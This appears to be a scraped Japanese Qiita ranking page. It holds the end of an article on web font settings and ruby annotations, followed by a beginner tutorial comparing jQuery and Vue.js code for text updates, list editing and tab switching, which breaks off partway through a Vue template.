<p>上記のコードは低解像度ディスプレイ上ではやや太めに、高解像度ディスプレイ（retinaなど）では細くスッキリと見せるためのものです。</p>

<p>しかし、使っているフォントや色によってはみづらい場合もあるので、そのあたりは随時デザイナーと相談しながら調整しましょう。</p>

<h1>
<span id="この人の名前ルビ振ってほしい" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E4%BA%BA%E3%81%AE%E5%90%8D%E5%89%8D%E3%83%AB%E3%83%93%E6%8C%AF%E3%81%A3%E3%81%A6%E3%81%BB%E3%81%97%E3%81%84"><i class="fa fa-link"></i></a>「この人の名前、ルビ振ってほしい！」</h1>

<p>いざという時に便利なrubyタグ。（ルビってrubyだったんだ...）</p>

<div class="code-frame" data-lang="HTML"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">ruby</span><span class="p">&gt;</span>
  漢 <span class="p">&lt;</span><span class="nt">rt</span><span class="p">&gt;</span>Kan<span class="p">&lt;/</span><span class="nt">rt</span><span class="p">&gt;</span>
  字 <span class="p">&lt;</span><span class="nt">rt</span><span class="p">&gt;</span>ji<span class="p">&lt;/</span><span class="nt">rt</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">ruby</span><span class="p">&gt;</span>
</pre></div></div>

<h1>
<span id="その他" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96"><i class="fa fa-link"></i></a>その他</h1>

<p>Open Typeフォントのすごく細かい設定は、<a href="https://helpx.adobe.com/jp/typekit/using/open-type-syntax.html" rel="nofollow noopener" target="_blank">Typekitのサイト</a>などにかなり細かく紹介されているので、いざという時に備えて一度はざっと目を通して、何ができるのかを知っておきましょう！</p>

<p>=============</p>

<h1>
<span id="追記" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>追記</h1>

<p>はてなブックマークの方で、たくさんコメントをいただき、その中に、font-feature-settings に関して、<br>
- Webの文化に従った方がいい<br>
- デザインとコーディングを分業しているときはやめた方がいい<br>
- ブラウザ対応やアップデートの後追いが大変<br>
といったご意見をたくさんいただきました。ありがとうございます。</p>

<p>たしかに筆者自身、自分（たち）でデザインからマークアップまで面倒を見るサイトのときにはこれをやりますが、クライアントワークや、他のデザイナーがデザインしたサイトのマークアップの場合はここまではやらない（方がいい）ことが多いです。<br>
こういうのをやっているサイトをあまり見ない（増えてはいる）のは、上記のような理由があるのでしょう。</p>

<p>ブラウザ対応の件など、適宜加筆修正していきますので、よろしくおねがいします。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">23位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>399</kbd>
		<a target="_blank" href="https://qiita.com/chibinowa/items/e7b2596d06b8005e8e6f">jQuery から Vue.js への移行</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-13<br />09:39:13</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/83186.html">chibinowa</a>(6件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/83186/profile-images/1507209783">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[jQuery]</b> <b>[vue.js]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>最近耳にする Vue.js（ビュージェイエス） ってどんなもの？ jQuery とどう書き方違うの？とか、jQuery でやってたこういう事って Vue.js だとどうやるの？という jQuery から Vue.js へ移行しようかなぁ～と思っている人向けの小難しいことは省いた記事です。私もそちら側から来たものです。</p>

<p><a href="https://jp.vuejs.org/" rel="nofollow noopener" target="_blank">Vue.js 日本公式ページ（日本語翻訳率が半端ないと評判）</a></p>

<h1>
<span id="jquery-と-vuejs-の違い" class="fragment"></span><a href="#jquery-%E3%81%A8-vuejs-%E3%81%AE%E9%81%95%E3%81%84"><i class="fa fa-link"></i></a>jQuery と Vue.js の違い</h1>

<p>jQuery はセレクタ操作に特化したライブラリなので HTML の一部をちょっとだけ弄るには簡単で手軽に扱えます。複雑な処理をしたい場合その都度セレクタから要素を探して操作するので、反映が遅かったり同じデータを表示するはずの複数の要素がちゃんと同期していなかったり管理が大変になってきます。そこまで複雑な事はしていない、現状つらいと感じてなければ無理に変える必要はないと思います。</p>

<p>Vue.js は高速で動く 仮想DOM というものを使った設計で作られており・・・（難しいので省略）簡単にいうと、JavaScript のデータと HTML の要素を紐付けて、データが変われば勝手に表示に反映してくれます。毎回データと表示を同期させる処理を自分で書かなくてもよくなり、メンテナンスする時もデザインとスクリプトを行ったり来たりする事が減ります。インタラクティブなページや、状態管理が活躍するページに向いています。</p>

<h1>
<span id="seo-的にどうなの" class="fragment"></span><a href="#seo-%E7%9A%84%E3%81%AB%E3%81%A9%E3%81%86%E3%81%AA%E3%81%AE"><i class="fa fa-link"></i></a>SEO 的にどうなの？</h1>

<p>Vue.js で持っているデータはブラウザのソースコードを見ても表示されません。でも最近のクローラーは Vue.js などの JavaScript で出力された部分も拾ってくれるので気にする程ではないと思います。</p>

<p>シェア用の OGP など考慮する場合は SSR （サーバーサイドレンダリング）というものもあり、最初のアクセスのみサーバー側で初期画面に必要な DOM が展開された状態の HTML を構築し、それ以降は 仮想DOM を通して処理するようになります。</p>

<h1>
<span id="書き方の違い" class="fragment"></span><a href="#%E6%9B%B8%E3%81%8D%E6%96%B9%E3%81%AE%E9%81%95%E3%81%84"><i class="fa fa-link"></i></a>書き方の違い</h1>

<h2>
<span id="文字を入れ替える" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E3%82%92%E5%85%A5%E3%82%8C%E6%9B%BF%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>文字を入れ替える</h2>

<p><img alt=":mushroom:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f344.png" title=":mushroom:" width="20"> <a href="https://jsfiddle.net/mio/wxndwLbL/" rel="nofollow noopener" target="_blank">デモページ</a></p>

<p>まずは簡単に <code>World</code> を別の文字に変えるコードを作ってみます。</p>

<h3>
<span id="jquery-の場合" class="fragment"></span><a href="#jquery-%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>jQuery の場合</h3>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
  Hello <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">"message"</span><span class="p">&gt;</span>World<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span> !
  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">"update"</span><span class="p">&gt;</span>change<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">JavaScript</span></div>
<div class="highlight"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span> <span class="s1">'#update'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">$</span><span class="p">(</span><span class="s1">'#message'</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="s1">'jQuery'</span><span class="p">)</span>
<span class="p">})</span>
</pre></div>
</div>

<p>jQuery で書くとだいたいこんな感じでしょう。変える部分はタグで囲む必要がありますね。</p>

<h3>
<span id="vuejs-の場合" class="fragment"></span><a href="#vuejs-%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>Vue.js の場合</h3>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"app"</span><span class="p">&gt;</span>
  Hello {{ message }} !
  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">"update"</span><span class="p">&gt;</span>change<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">JavaScript</span></div>
<div class="highlight"><pre><span></span><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">el</span><span class="o">:</span> <span class="s1">'#app'</span><span class="p">,</span>
  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">message</span><span class="o">:</span> <span class="s1">'World'</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">update</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">message</span> <span class="o">=</span> <span class="s1">'Vue.js'</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">})</span>

</pre></div>
</div>

<p>Vue.js で書くとこんな感じになります。まだ違いは無いというかむしろ jQuery の方が楽そう。</p>

<p>文字列は最初からデータで持っておき、データの文字列を画面に表示させる場合は <code>{{ message }}</code> と書きます。</p>

<p><code>@click="式やメソッド"</code> は jQuery の <code>$(element).on('click', ...)</code> と似たような振る舞いをします。メソッド名を書くことも出来るし使いまわさない短いものなら直接式を書いてもいい。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="k">this</span><span class="p">.</span><span class="nx">message</span> <span class="o">=</span> <span class="s1">'Vue.js'</span>
</pre></div></div>

<p>データを変更すれば一緒に <code>{{ message }}</code> この部分が変更されます。</p>

<h2>
<span id="リスト要素の追加と削除" class="fragment"></span><a href="#%E3%83%AA%E3%82%B9%E3%83%88%E8%A6%81%E7%B4%A0%E3%81%AE%E8%BF%BD%E5%8A%A0%E3%81%A8%E5%89%8A%E9%99%A4"><i class="fa fa-link"></i></a>リスト要素の追加と削除</h2>

<p><img alt=":mushroom:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f344.png" title=":mushroom:" width="20"> <a href="https://jsfiddle.net/mio/fjp4bh1v/" rel="nofollow noopener" target="_blank">デモページ</a></p>

<p><code>add</code> ボタンを押すとリストに新しい要素を追加し、 <code>remove</code> ボタンを押すとその要素を削除します。ついでに現在のリスト要素の数も表示してみましょう。</p>

<h3>
<span id="jquery-の場合-1" class="fragment"></span><a href="#jquery-%E3%81%AE%E5%A0%B4%E5%90%88-1"><i class="fa fa-link"></i></a>jQuery の場合</h3>

<p>Ajax で取得したという想定で jQuery も最初はデータから表示するようにしました。</p>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Length: <span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">"length"</span><span class="p">&gt;</span>0<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span> <span class="na">id</span><span class="o">=</span><span class="s">"list"</span><span class="p">&gt;&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">"add"</span><span class="p">&gt;</span>add<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">JavaScript</span></div>
<div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">counter</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="kd">var</span> <span class="nx">list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'Apple'</span><span class="p">,</span> <span class="s1">'Banana'</span><span class="p">,</span> <span class="s1">'Strawberry'</span><span class="p">]</span>

  <span class="nx">init</span><span class="p">()</span>

  <span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span> <span class="s1">'#add'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">addItem</span><span class="p">(</span><span class="s1">'Orange'</span> <span class="o">+</span> <span class="p">(</span><span class="o">++</span><span class="nx">counter</span><span class="p">).</span><span class="nx">toString</span><span class="p">())</span>
  <span class="p">})</span>
  <span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span> <span class="s1">'.remove'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">).</span><span class="nx">parent</span><span class="p">().</span><span class="nx">remove</span><span class="p">()</span>
    <span class="nx">updateLength</span><span class="p">()</span>
  <span class="p">})</span>

  <span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">list</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">addItem</span><span class="p">(</span><span class="nx">list</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">addItem</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="s1">'#list'</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="s1">'&lt;li&gt;'</span> <span class="o">+</span> <span class="nx">name</span> <span class="o">+</span> <span class="s1">' &lt;button class="remove"&gt;remove&lt;/button&gt;&lt;/li&gt;'</span><span class="p">)</span>
    <span class="nx">updateLength</span><span class="p">()</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">updateLength</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="s1">'#length'</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">'#list li'</span><span class="p">).</span><span class="nx">length</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">})()</span>
</pre></div>
</div>

<p>jQuery を使うにしてもクラス化したりもっと綺麗に書く人もいると思うけどこんな感じだと思います。</p>

<p>まあ <code>&lt;span id="length"&gt;0&lt;/span&gt;</code> こいつがよくいる厄介なデータである。 これをリスト要素の数と同期させるには変更があったら毎回 <code>updateLength()</code> をしないといけない。凄く面倒くさい。</p>

<p>テンプレートもロジックに入り込んでいるのでメンテナンスが大変なやつです。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="s1">'#list'</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="s1">'&lt;li&gt;'</span> <span class="o">+</span> <span class="nx">name</span> <span class="o">+</span> <span class="s1">' &lt;button class="remove"&gt;remove&lt;/button&gt;&lt;/li&gt;'</span><span class="p">)</span>
</pre></div></div>

<p>あと jQuery はセレクタがないと生きていけないタイプなので操作する場所が増えるに連れて ID やクラスなどの Attribute もどんどん増えていきます。</p>

<h3>
<span id="vuejs-の場合-1" class="fragment"></span><a href="#vuejs-%E3%81%AE%E5%A0%B4%E5%90%88-1"><i class="fa fa-link"></i></a>Vue.js の場合</h3>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"app"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Length: {{ length }}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">"(item, i) in list"</span> <span class="na">:key</span><span class="o">=</span><span class="s">"item"</span><span class="p">&gt;</span>{{ item }}
      <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">"list.splice(i, 1)"</span><span class="p">&gt;</span>remove<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">"addItem"</span><span class="p">&gt;</span>add<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">JavaScript</span></div>
<div class="highlight"><pre><span></span><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">el</span><span class="o">:</span> <span class="s1">'#app'</span><span class="p">,</span>
  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">counter</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="nx">list</span><span class="o">:</span> <span class="p">[</span><span class="s1">'Apple'</span><span class="p">,</span> <span class="s1">'Banana'</span><span class="p">,</span> <span class="s1">'Strawberry'</span><span class="p">]</span>
  <span class="p">},</span>
  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">length</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">length</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">addItem</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">'Orange'</span> <span class="o">+</span> <span class="p">(</span><span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">counter</span><span class="p">).</span><span class="nx">toString</span><span class="p">())</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">})</span>
</pre></div>
</div>

<p>だいぶ違いが見えてきました。</p>

<p><code>addItem</code> は jQuery も Vue.js も新しい要素を追加する関数ですがやっている事が大分違います。要素への追加と削除もデータ側の配列を操作するだけでOK。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">'Orange'</span> <span class="o">+</span> <span class="p">(</span><span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">counter</span><span class="p">).</span><span class="nx">toString</span><span class="p">())</span>
</pre></div></div>

<p>厄介な <code>length</code> はというと、<code>computed</code> という関数型のデータで配列の長さを返すものを1個作っておけばそれがリアルタイムで表示されます。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
  <span class="c1">// この部分がデータと同じ役割</span>
  <span class="nx">length</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">list</span><span class="p">.</span><span class="nx">length</span>
  <span class="p">}</span>
<span class="p">},</span>
</pre></div></div>

<p>勿論 <code>{{ list.length }}</code> と書いても大丈夫だけど、<code>computed</code> は<strong>キャッシュされる</strong>のでフィルターとかの複雑な処理に便利です。</p>

<p>ステキですね。</p>

<h2>
<span id="表示非表示の切り替えとトランジションアニメーション" class="fragment"></span><a href="#%E8%A1%A8%E7%A4%BA%E9%9D%9E%E8%A1%A8%E7%A4%BA%E3%81%AE%E5%88%87%E3%82%8A%E6%9B%BF%E3%81%88%E3%81%A8%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B8%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%A2%E3%83%8B%E3%83%A1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>表示・非表示の切り替えとトランジション/アニメーション</h2>

<p><img alt=":mushroom:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f344.png" title=":mushroom:" width="20"> <a href="https://jsfiddle.net/mio/hk2me9tj/" rel="nofollow noopener" target="_blank">デモページ</a></p>

<p>よくあるタブ切り替えのコンテンツを作ってみましょう。</p>

<p><code>button</code> を使えばクリックとエンターが受け取れるのだけどキーコードの確認も結構違うのであえて <code>tabindex</code> を使いました。 WAI-ARIA とかまでは考慮してません。</p>

<h3>
<span id="jquery-の場合-2" class="fragment"></span><a href="#jquery-%E3%81%AE%E5%A0%B4%E5%90%88-2"><i class="fa fa-link"></i></a>jQuery の場合</h3>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span> <span class="na">id</span><span class="o">=</span><span class="s">"tab"</span> <span class="na">class</span><span class="o">=</span><span class="s">"tab"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">data-id</span><span class="o">=</span><span class="s">"1"</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">"0"</span><span class="p">&gt;</span>menu1<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">data-id</span><span class="o">=</span><span class="s">"2"</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">"0"</span><span class="p">&gt;</span>menu2<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">data-id</span><span class="o">=</span><span class="s">"3"</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">"0"</span><span class="p">&gt;</span>menu3<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"content"</span> <span class="na">class</span><span class="o">=</span><span class="s">"content"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">section</span> <span class="na">data-id</span><span class="o">=</span><span class="s">"1"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>content1<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">section</span> <span class="na">data-id</span><span class="o">=</span><span class="s">"2"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>content2<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">section</span> <span class="na">data-id</span><span class="o">=</span><span class="s">"3"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>content3<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">JavaScript</span></div>
<div class="highlight"><pre><span></span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">current</span> <span class="o">=</span> <span class="mi">1</span>
  <span class="nx">init</span><span class="p">()</span>

  <span class="nx">$</span><span class="p">(</span><span class="s1">'#tab'</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span> <span class="s1">'li'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">changeTab</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">data</span><span class="p">(</span><span class="s1">'id'</span><span class="p">))</span>
  <span class="p">})</span>
  <span class="nx">$</span><span class="p">(</span><span class="s2">"#tab"</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">'keypress'</span><span class="p">,</span> <span class="s1">'li'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">13</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">changeTab</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">data</span><span class="p">(</span><span class="s1">'id'</span><span class="p">))</span>
    <span class="p">}</span>
  <span class="p">})</span>

  <span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">changeTab</span><span class="p">(</span><span class="nx">current</span><span class="p">)</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">changeTab</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="s1">'#content section:not([data-id="'</span> <span class="o">+</span> <span class="nx">id</span> <span class="o">+</span> <span class="s1">'"])'</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">'active'</span><span class="p">)</span>
    <span class="nx">$</span><span class="p">(</span><span class="s1">'#content section[data-id="'</span> <span class="o">+</span> <span class="nx">id</span> <span class="o">+</span> <span class="s1">'"]'</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="s1">'active'</span><span class="p">)</span>
    <span class="nx">$</span><span class="p">(</span><span class="s1">'#tab li:not([data-id="'</span> <span class="o">+</span> <span class="nx">id</span> <span class="o">+</span> <span class="s1">'"])'</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">'active'</span><span class="p">)</span>
    <span class="nx">$</span><span class="p">(</span><span class="s1">'#tab li[data-id="'</span> <span class="o">+</span> <span class="nx">id</span> <span class="o">+</span> <span class="s1">'"]'</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="s1">'active'</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">})()</span>
</pre></div>
</div>

<p>アクティブな要素にクラスを付けたり消したりします。</p>

<p><code>display:none</code> が付いてるので切り替えのフェードインにはトランジションの代用でアニメーションを使用しました。 <code>visibility</code> などを使ってもいいけど、このへんの実装も CSS 大好きじゃないとだれてきます。</p>

<p>私もフェードアウト作る時点でだれてしまいました。</p>

<h3>
<span id="vuejs-の場合-2" class="fragment"></span><a href="#vuejs-%E3%81%AE%E5%A0%B4%E5%90%88-2"><i class="fa fa-link"></i></a>Vue.js の場合</h3>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"app"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span> <span class="na">class</span><span class="o">=</span><span class="s">"tab"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span> <span class="na">v-for</span><span class="o">=</span><span class="s">"item in list"</span> 
        <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">"changeTab(item.id)"</span> 
        <span class="err">@</span><span class="na">keyup</span><span class="err">.</span><span class="na">enter</span><span class="o">=</span><span class="s">"changeTab(item.id)"</span> 
        <span class="na">:class</span><span class="o">=</span><span class="s">"{active:active(item.id)}"</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">"0"</span><span class="p">&gt;</span>{{ item.label }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
